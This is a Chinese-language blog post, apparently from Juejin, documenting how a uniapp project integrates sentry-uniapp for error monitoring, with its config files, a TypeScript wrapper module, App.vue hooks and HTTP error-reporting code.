content="https://juejin.cn/user/2538123586707662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uniapp 项目接入 sentry监控
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2538123586707662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    半瓶神仙醋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:03:51.000Z" title="Mon Nov 24 2025 05:03:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Sentry 接入使用文档</h2>
<h3 data-id="heading-1">📋 目录</h3>
<ul>
<li><a href="#%E6%A6%82%E8%BF%B0" title="#%E6%A6%82%E8%BF%B0">概述</a></li>
<li><a href="#%E4%BE%9D%E8%B5%96%E5%AE%89%E8%A3%85" title="#%E4%BE%9D%E8%B5%96%E5%AE%89%E8%A3%85">依赖安装</a></li>
<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE" title="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE" title="#%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE">核心配置</a></li>
<li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B" title="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B">初始化流程</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F" title="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">使用方式</a></li>
<li><a href="#%E9%94%99%E8%AF%AF%E4%B8%8A%E6%8A%A5%E5%9C%BA%E6%99%AF" title="#%E9%94%99%E8%AF%AF%E4%B8%8A%E6%8A%A5%E5%9C%BA%E6%99%AF">错误上报场景</a></li>
<li><a href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%85%B3%E8%81%94" title="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%85%B3%E8%81%94">用户信息关联</a></li>
<li><a href="#%E5%B9%B3%E5%8F%B0%E5%B7%AE%E5%BC%82%E8%AF%B4%E6%98%8E" title="#%E5%B9%B3%E5%8F%B0%E5%B7%AE%E5%BC%82%E8%AF%B4%E6%98%8E">平台差异说明</a></li>
</ul>
<hr/>
<h3 data-id="heading-2">概述</h3>
<p>本项目使用 <code>sentry-uniapp</code> 进行错误监控和上报，支持 H5、小程序、APP 多平台。Sentry 会自动捕获未处理的异常，同时提供手动上报接口用于业务错误和异常。</p>
<h4 data-id="heading-3">核心特性</h4>
<ul>
<li>✅ 自动捕获全局异常</li>
<li>✅ HTTP 请求错误自动上报</li>
<li>✅ 业务错误码上报</li>
<li>✅ 用户信息关联</li>
<li>✅ 环境开关控制</li>
<li>✅ 多平台支持</li>
</ul>
<hr/>
<h3 data-id="heading-4">依赖安装</h3>
<p>项目已安装 Sentry 依赖包：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sentry-uniapp"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.0.12"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">环境配置</h3>
<h4 data-id="heading-6">1. 环境变量配置</h4>
<p>在 <code>.env</code> 文件中配置 Sentry DSN：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Sentry DSN（必填，用于错误上报）</span>
VITE_SENTRY_DSN=https://your-sentry-dsn@sentry.io/project-id

<span class="hljs-comment"># 是否启用 Sentry（可选，默认从 profile 读取）</span>
VITE_SENTRY_ENABLE=<span class="hljs-literal">true</span>
</code></pre>
<p><strong>类型定义</strong> (<code>typings/env.d.ts</code>):</p>
<pre><code class="hljs language-36:39:typings/env.d.ts" lang="36:39:typings/env.d.ts">  /** Sentry DSN */
  readonly VITE_SENTRY_DSN?: string
  /** 是否启用 Sentry */
  readonly VITE_SENTRY_ENABLE?: 'true' | 'false'
</code></pre>
<h4 data-id="heading-7">2. Profile 配置</h4>
<p>在 <code>env-conf.ts</code> 中配置各环境的 Sentry 开关：</p>
<pre><code class="hljs language-15:33:env-conf.ts" lang="15:33:env-conf.ts">      // 是否启用Sentry
      SENTRY_ENABLE: true,
    },
    uat: {
      DELETE_CONSOLE: false,
      SHOW_SOURCEMAP: false,
      APP_PROXY_ENABLE: false,
      CLIENT_TYPE_BUYER: 'buyer',
      CLIENT_TYPE_SELLER: 'seller',
      SENTRY_ENABLE: false,
    },
    production: {
      DELETE_CONSOLE: false,
      SHOW_SOURCEMAP: false,
      APP_PROXY_ENABLE: false,
      CLIENT_TYPE_BUYER: 'buyer',
      CLIENT_TYPE_SELLER: 'seller',
      SENTRY_ENABLE: true,
    },
</code></pre>
<p><strong>配置说明</strong>：</p>
<ul>
<li><code>development</code>: 开发环境，默认启用</li>
<li><code>uat</code>: 测试环境，默认关闭</li>
<li><code>production</code>: 生产环境，默认启用</li>
</ul>
<hr/>
<h3 data-id="heading-8">核心配置</h3>
<h4 data-id="heading-9">Sentry 核心文件 (<code>src/sentry.ts</code>)</h4>
<p>这是 Sentry 的核心配置文件，提供了初始化、错误捕获、用户信息设置等功能。以下是完整的代码：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Sentry</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'sentry-uniapp'</span>
<span class="hljs-keyword">import</span> { profile } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/profile'</span>

<span class="hljs-comment">/**
 * 检查是否启用 Sentry
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isSentryEnabled</span>(<span class="hljs-params"/>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">VITE_SENTRY_DSN</span> } = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>
  <span class="hljs-comment">// 必须同时满足：profile 中启用开关为 true 且 DSN 已配置</span>
  <span class="hljs-keyword">return</span> profile.<span class="hljs-property">SENTRY_ENABLE</span> &amp;&amp; !!<span class="hljs-variable constant_">VITE_SENTRY_DSN</span>
}

<span class="hljs-comment">/**
 * 初始化 Sentry
 * 在 App.vue 的 onLaunch 中调用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initSentry</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">VITE_SENTRY_DSN</span> } = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>

  <span class="hljs-comment">// 检查是否启用</span>
  <span class="hljs-keyword">if</span> (!profile.<span class="hljs-property">SENTRY_ENABLE</span>) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// 检查 DSN 是否配置</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">VITE_SENTRY_DSN</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'[Sentry] 已启用但 DSN 未配置，Sentry 初始化失败'</span>)
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-keyword">const</span> isAppPlatform =
    <span class="hljs-title class_">String</span>(__UNI_PLATFORM__) === <span class="hljs-string">'app'</span> || <span class="hljs-title class_">String</span>(__UNI_PLATFORM__) === <span class="hljs-string">'app-harmony'</span>

  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">init</span>({
    <span class="hljs-attr">dsn</span>: <span class="hljs-variable constant_">VITE_SENTRY_DSN</span>,
    <span class="hljs-comment">// extraOptions 主要是解决平台差异问题的</span>
    <span class="hljs-comment">// 非 APP 平台，可以不使用</span>
    <span class="hljs-attr">extraOptions</span>: isAppPlatform
      ? {
          <span class="hljs-attr">onmemorywarning</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">onerror</span>: <span class="hljs-literal">false</span>,
        }
      : <span class="hljs-literal">undefined</span>,
  })
}

<span class="hljs-comment">/**
 * 设置 Sentry 用户信息
 * 保留此函数，因为 src/stores/user.ts 中需要使用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setSentryUser</span>(<span class="hljs-params">userInfo?: { id?: <span class="hljs-built_in">string</span>; username?: <span class="hljs-built_in">string</span> }</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">if</span> (userInfo?.<span class="hljs-property">id</span> &amp;&amp; userInfo?.<span class="hljs-property">username</span>) {
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">configureScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
      scope.<span class="hljs-title function_">setUser</span>({
        <span class="hljs-attr">id</span>: <span class="hljs-title class_">String</span>(userInfo.<span class="hljs-property">id</span>), <span class="hljs-comment">// 确保 id 是字符串</span>
        <span class="hljs-attr">username</span>: userInfo.<span class="hljs-property">username</span>,
      })
    })
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">configureScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
      scope.<span class="hljs-title function_">setUser</span>(<span class="hljs-literal">null</span>)
    })
  }
}

<span class="hljs-comment">/**
 * 捕获异常
 * 在 App.vue 的 onError 中调用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">captureException</span>(<span class="hljs-params">error: <span class="hljs-built_in">unknown</span>, extra?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// 使用 withScope 确保额外信息能够正确附加</span>
  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">withScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (extra) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(extra).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
        scope.<span class="hljs-title function_">setExtra</span>(key, extra[key])
      })
    }
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">captureException</span>(error)
  })
}

<span class="hljs-comment">/**
 * 捕获消息
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">captureMessage</span>(<span class="hljs-params">message: <span class="hljs-built_in">string</span>, extra?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// 使用 withScope 确保额外信息（包括 traceId）能够正确附加</span>
  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">withScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (extra) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'extra'</span>, extra)
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(extra).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
        scope.<span class="hljs-title function_">setExtra</span>(key, extra[key])
      })
    }
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">captureMessage</span>(message)
  })
}

<span class="hljs-comment">// 导出 Sentry 对象，以便在需要时直接使用</span>
<span class="hljs-keyword">export</span> { <span class="hljs-title class_">Sentry</span> }
</code></pre>
<p><strong>代码说明</strong>：</p>
<ol>
<li>
<p><strong><code>isSentryEnabled()</code></strong>: 检查是否启用 Sentry，必须同时满足 <code>profile.SENTRY_ENABLE === true</code> 和 <code>VITE_SENTRY_DSN</code> 已配置</p>
</li>
<li>
<p><strong><code>initSentry()</code></strong>: 初始化 Sentry</p>
<ul>
<li>检查启用开关和 DSN 配置</li>
<li>APP 平台需要特殊配置 <code>extraOptions</code> 来禁用某些钩子，避免与 <code>App.onError</code> 冲突</li>
</ul>
</li>
<li>
<p><strong><code>setSentryUser()</code></strong>: 设置或清除 Sentry 用户信息</p>
<ul>
<li>用于关联错误和用户，便于问题追踪</li>
<li>登出时传入 <code>undefined</code> 清除用户信息</li>
</ul>
</li>
<li>
<p><strong><code>captureException()</code></strong>: 捕获异常</p>
<ul>
<li>用于真正的异常（网络错误、代码错误等）</li>
<li>支持附加额外上下文信息</li>
</ul>
</li>
<li>
<p><strong><code>captureMessage()</code></strong>: 捕获消息</p>
<ul>
<li>用于业务逻辑错误（错误码等，不是异常）</li>
<li>支持附加额外上下文信息</li>
</ul>
</li>
<li>
<p><strong>导出 Sentry 对象</strong>: 允许在特殊场景下直接使用 Sentry 的原生 API</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-10">初始化流程</h3>
<h4 data-id="heading-11">App.vue 中的初始化</h4>
<p>在 <code>src/App.vue</code> 的 <code>onLaunch</code> 钩子中初始化 Sentry：</p>
<pre><code class="hljs language-87:111:src/App.vue" lang="87:111:src/App.vue">onLaunch(() =&gt; {
  console.log('App Launch')

  // 初始化 Sentry
  initSentry()

  // 安全初始化埋点SDK（内部会等待 App 实例准备好）
  safeInitTrack()

  // 延迟检查和测试（给足够时间让埋点初始化完成）
  setTimeout(() =&gt; {
    if (checkTrackInit()) {
      // 开发环境下测试埋点
      if (import.meta.env.MODE === 'dev') {
        testTrack()
      }
    }

    // 设置 Sentry 用户信息
    const userStore = useUserStore()
    const { userId, username } = userStore.userInfo || {}
    if (userId &amp;&amp; username) {
      setSentryUser({ id: userId, username })
    }
  }, 3500) // 增加到 3.5 秒，确保 waitForAppReady 完成
</code></pre>
<h4 data-id="heading-12">全局错误捕获</h4>
<p>在 <code>src/App.vue</code> 的 <code>onError</code> 钩子中捕获全局异常：</p>
<pre><code class="hljs language-146:155:src/App.vue" lang="146:155:src/App.vue">// sentry-uniapp 内部是通过 uni.onError 钩子函数捕获错误的
// 但目前 uni.onError 暂不支持 App (android / ios)，各平台支持情况参考：
// https://uniapp.dcloud.net.cn/api/application.html#onerror
//
// 通用方案：
// 可用 App.onError 自己处理，但需要先禁用 sentry 里的捕获
// 方法在 sentry.init 参数里加上 extraOptions: { onerror: false }
onError((error: unknown) =&gt; {
  captureException(error)
})
</code></pre>
<p><strong>注意</strong>：</p>
<ul>
<li><code>sentry-uniapp</code> 内部通过 <code>uni.onError</code> 钩子捕获错误</li>
<li>但 <code>uni.onError</code> 暂不支持 APP 平台（Android/iOS）</li>
<li>APP 平台需要在 <code>sentry.init</code> 中配置 <code>extraOptions: { onerror: false }</code>，然后使用 <code>App.onError</code> 手动捕获</li>
</ul>
<hr/>
<h3 data-id="heading-13">使用方式</h3>
<h4 data-id="heading-14">1. 导入函数</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { captureException, captureMessage, setSentryUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/sentry'</span>
</code></pre>
<h4 data-id="heading-15">2. 捕获异常</h4>
<p>用于捕获真正的异常（如网络错误、代码错误等）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">try</span> {
  <span class="hljs-comment">// 可能出错的代码</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">someAsyncOperation</span>()
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-title function_">captureException</span>(error, {
    <span class="hljs-comment">// 可选的额外信息</span>
    <span class="hljs-attr">operation</span>: <span class="hljs-string">'someOperation'</span>,
    <span class="hljs-attr">userId</span>: <span class="hljs-string">'123'</span>,
  })
}
</code></pre>
<h4 data-id="heading-16">3. 捕获业务错误</h4>
<p>用于捕获业务逻辑返回的错误（不是异常，而是业务错误码）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">apiCall</span>()
<span class="hljs-keyword">if</span> (!response.<span class="hljs-property">succeed</span>) {
  <span class="hljs-title function_">captureMessage</span>(<span class="hljs-string">`业务返回错误码: <span class="hljs-subst">${response.code}</span>`</span>, {
    <span class="hljs-attr">errorCode</span>: response.<span class="hljs-property">code</span>,
    <span class="hljs-attr">traceId</span>: response.<span class="hljs-property">traceId</span>,
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/endpoint'</span>,
  })
}
</code></pre>
<h4 data-id="heading-17">4. 设置用户信息</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 设置用户信息</span>
<span class="hljs-title function_">setSentryUser</span>({ <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span>, <span class="hljs-attr">username</span>: <span class="hljs-string">'john_doe'</span> })

<span class="hljs-comment">// 清除用户信息（登出时）</span>
<span class="hljs-title function_">setSentryUser</span>()
</code></pre>
<hr/>
<h3 data-id="heading-18">错误上报场景</h3>
<h4 data-id="heading-19">1. HTTP 请求错误上报</h4>
<p>在 <code>src/service/index.ts</code> 中，HTTP 请求拦截器会自动上报错误：</p>
<h5 data-id="heading-20">业务错误上报（使用 captureMessage）</h5>
<pre><code class="hljs language-14:25:src/service/index.ts" lang="14:25:src/service/index.ts">function reportBusinessErrorToSentry(
  message: string,
  requestOptions: CustomRequestOptions,
  extra?: Record&lt;string, unknown&gt;,
): void {
  captureMessage(message, {
    url: requestOptions.url,
    method: requestOptions.method || 'GET',
    requestParams: requestOptions.data || requestOptions.query || {},
    ...extra,
  })
}
</code></pre>
<p><strong>使用场景</strong>：</p>
<pre><code class="hljs language-48:55:src/service/index.ts" lang="48:55:src/service/index.ts">function handleBusinessError&lt;T&gt;(data: BaseRes&lt;T&gt;, requestOptions: CustomRequestOptions): boolean {
  globalErrorMonitor.handleError(data.code, data)
  // 业务错误使用 captureMessage（不是异常，是业务逻辑返回的错误）
  reportBusinessErrorToSentry(`业务返回错误码: ${data.code}`, requestOptions, {
    errorCode: data.code,
    traceId: data.traceId,
    errorData: data,
  })
</code></pre>
<h5 data-id="heading-21">HTTP 错误上报（使用 captureException）</h5>
<pre><code class="hljs language-30:42:src/service/index.ts" lang="30:42:src/service/index.ts">function reportExceptionToSentry(
  message: string,
  requestOptions: CustomRequestOptions,
  extra?: Record&lt;string, unknown&gt;,
): void {
  const error = new Error(message)
  captureException(error, {
    url: requestOptions.url,
    method: requestOptions.method || 'GET',
    requestParams: requestOptions.data || requestOptions.query || {},
    ...extra,
  })
}
</code></pre>
<p><strong>使用场景</strong>：</p>
<pre><code class="hljs language-75:85:src/service/index.ts" lang="75:85:src/service/index.ts">function handleHttpError&lt;T&gt;(
  statusCode: number,
  data: BaseRes&lt;T&gt;,
  requestOptions: CustomRequestOptions,
): void {
  const message = data.message || (statusCode === 401 ? '未授权' : '请求错误')
  // HTTP 错误使用 captureException（是真正的异常）
  reportExceptionToSentry(`HTTP ${statusCode}: ${message}`, requestOptions, {
    statusCode,
    errorData: data,
  })
</code></pre>
<h5 data-id="heading-22">网络错误上报（使用 captureException）</h5>
<pre><code class="hljs language-95:100:src/service/index.ts" lang="95:100:src/service/index.ts">function handleNetworkError&lt;T&gt;(err: unknown, requestOptions: CustomRequestOptions): BaseRes&lt;T&gt; {
  uni.showToast({ icon: 'none', title: '网络错误，换个网络试试' })

  const errorMessage = typeof err === 'string' ? err : JSON.stringify(err)
  // 网络错误使用 captureException（是真正的异常）
  reportExceptionToSentry(`网络请求失败: ${errorMessage}`, requestOptions, { errorData: err })
</code></pre>
<h4 data-id="heading-23">2. 全局错误监控</h4>
<p>在 <code>src/utils/globalErrorMonitor.ts</code> 中，未处理的错误码会统一上报到 Sentry：</p>
<pre><code class="hljs language-28:37:src/utils/globalErrorMonitor.ts" lang="28:37:src/utils/globalErrorMonitor.ts">  public handleError(errCode: string, errorData?: any): void {
    switch (errCode) {
      case 'ACOM10000':
        this.handlePermissionUpdated()
        break
      // 可以添加其他错误码的处理
      default:
        // 未处理的错误码已在 service/index.ts 中统一上报到 Sentry
        break
    }
  }
</code></pre>
<hr/>
<h3 data-id="heading-24">用户信息关联</h3>
<h4 data-id="heading-25">自动设置用户信息</h4>
<p>在用户登录或获取用户信息后，自动设置 Sentry 用户信息：</p>
<h5 data-id="heading-26">1. App.vue 中初始化时设置</h5>
<pre><code class="hljs language-105:110:src/App.vue" lang="105:110:src/App.vue">    // 设置 Sentry 用户信息
    const userStore = useUserStore()
    const { userId, username } = userStore.userInfo || {}
    if (userId &amp;&amp; username) {
      setSentryUser({ id: userId, username })
    }
</code></pre>
<h5 data-id="heading-27">2. User Store 中设置</h5>
<p>在 <code>src/stores/user.ts</code> 中，设置用户信息时自动关联 Sentry：</p>
<pre><code class="hljs language-23:32:src/stores/user.ts" lang="23:32:src/stores/user.ts">    const setUserInfo = (val: UserModel) =&gt; {
      userInfo.value = val
      // 设置 Sentry 用户信息
      if (val.userId &amp;&amp; val.username) {
        setSentryUser({
          id: val.userId,
          username: val.username,
        })
      }
    }
</code></pre>
<h5 data-id="heading-28">3. 清除用户信息</h5>
<p>登出时清除 Sentry 用户信息：</p>
<pre><code class="hljs language-44:51:src/stores/user.ts" lang="44:51:src/stores/user.ts">    const clearAll = () =&gt; {
      userInfo.value = { ...initState }
      companyInfo.value = {}
      realNameInfo.value = {}
      hasCompanyList.value = false
      // 清除 Sentry 用户信息
      setSentryUser()
    }
</code></pre>
<hr/>
<h3 data-id="heading-29">平台差异说明</h3>
<h4 data-id="heading-30">APP 平台特殊配置</h4>
<p>APP 平台（Android/iOS）需要在初始化时禁用某些钩子，避免与 <code>App.onError</code> 冲突：</p>
<pre><code class="hljs language-31:44:src/sentry.ts" lang="31:44:src/sentry.ts">  const isAppPlatform =
    String(__UNI_PLATFORM__) === 'app' || String(__UNI_PLATFORM__) === 'app-harmony'

  Sentry.init({
    dsn: VITE_SENTRY_DSN,
    // extraOptions 主要是解决平台差异问题的
    // 非 APP 平台，可以不使用
    extraOptions: isAppPlatform
      ? {
          onmemorywarning: false,
          onerror: false,
        }
      : undefined,
  })
</code></pre>
<p><strong>原因</strong>：</p>
<ul>
<li><code>uni.onError</code> 在 APP 平台不支持</li>
<li>需要在 <code>App.onError</code> 中手动捕获错误</li>
<li>因此需要禁用 Sentry 内部的 <code>onerror</code> 钩子</li>
</ul>
<h4 data-id="heading-31">平台支持情况</h4>
<p>参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Fapi%2Fapplication.html%23onerror" target="_blank" title="https://uniapp.dcloud.net.cn/api/application.html#onerror" ref="nofollow noopener noreferrer">uni-app 官方文档</a>：</p>
<ul>
<li>✅ H5: 支持 <code>uni.onError</code></li>
<li>✅ 小程序: 支持 <code>uni.onError</code></li>
<li>❌ APP: 不支持 <code>uni.onError</code>，需要使用 <code>App.onError</code></li>
</ul>
<hr/>
<h3 data-id="heading-32">总结</h3>
<h4 data-id="heading-33">配置检查清单</h4>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 在 <code>.env</code> 文件中配置 <code>VITE_SENTRY_DSN</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 在 <code>env-conf.ts</code> 中配置各环境的 <code>SENTRY_ENABLE</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保 <code>src/App.vue</code> 中调用了 <code>initSentry()</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保 <code>src/App.vue</code> 中配置了 <code>onError</code> 钩子</li>
